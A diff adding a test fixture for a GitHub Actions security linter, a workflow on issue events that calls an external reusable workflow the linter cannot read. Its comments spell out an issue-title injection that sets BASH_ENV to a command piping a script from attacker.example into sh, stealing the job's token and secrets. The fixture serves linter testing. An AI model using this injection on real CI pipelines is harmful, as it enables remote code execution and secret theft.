@@ -1,0 +1,21 @@
+# situation: a job calls the reusable workflow .github/workflows/w.yml of
+#   the repository example-org/unsecure-commands-unanswered, whose content
+#   is the workflow of the true positive controlled
+#   (controlled.custom-shell-xtrace.yml) of the rule, with on: workflow_call
+#   in place of the on of controlled.custom-shell-xtrace.yml. The linter has
+#   no answer of the fact workflow.definition for the reusable workflow.
+# reason: a todo (a fact): the jobs of a reusable workflow run on the event
+#   that started the run of the calling job, and the linter does not read
+#   the reusable workflow.
+# cause: the rule reads a reusable workflow of another repository only from
+#   the answer of workflow.definition.
+# attack: the attacker opens an issue titled ##[set-env
+#   name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
+# attack-run-behavior: the trace prints the git log command with the title,
+#   the runner sets BASH_ENV, and the bash of the next step runs the
+#   attacker's script with the token and the secrets of the job.
+on: issues
+permissions: {}
+jobs:
+  c:
+    uses: example-org/unsecure-commands-unanswered/.github/workflows/w.yml@eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
